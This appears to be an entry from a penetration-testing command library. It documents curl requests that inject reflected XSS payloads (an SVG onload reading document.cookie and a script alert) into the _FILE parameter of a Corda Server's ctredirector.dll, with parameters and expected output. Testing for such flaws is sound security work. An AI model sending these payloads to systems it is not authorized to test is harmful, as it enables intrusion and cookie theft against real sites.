---
data: >-
  curl
  "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>"
  -v
tags:
  - xss
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.277Z'
id: a117c909-c336-4040-9568-41544e1f076c
verified: false
validated: true
submitted: true
---
# curl-inject-xss-file

## Command

```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>" -v
```

## Description

This command uses curl to send a GET request to the ctredirector.dll endpoint with a malicious @_FILE parameter, injecting an XSS payload to trigger an error echo. Use it to test for unsanitized input reflection in error messages.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target.com` | The hostname or IP of the Corda Server | Yes |
| `_FILE=...` | The parameter with invalid URL and XSS payload | Yes |
| `-v` | Verbose mode to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://invalid.com/<script>alert(1)</script>" -v
```

### Advanced Usage

```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>" -v -H "User-Agent: Mozilla/5.0"
```

## Expected Output

A server response (likely 200 OK or 500 Internal Server Error) with verbose details, including the echoed payload in the body like "Error: Failed to load http://google.com/<svg/onload=confirm(document.cookie)>". No JS execution in curl, but confirms reflection.

## Related

- [[Related Procedure|procedures/Inject-XSS-Payload-in-_FILE-Parameter]]
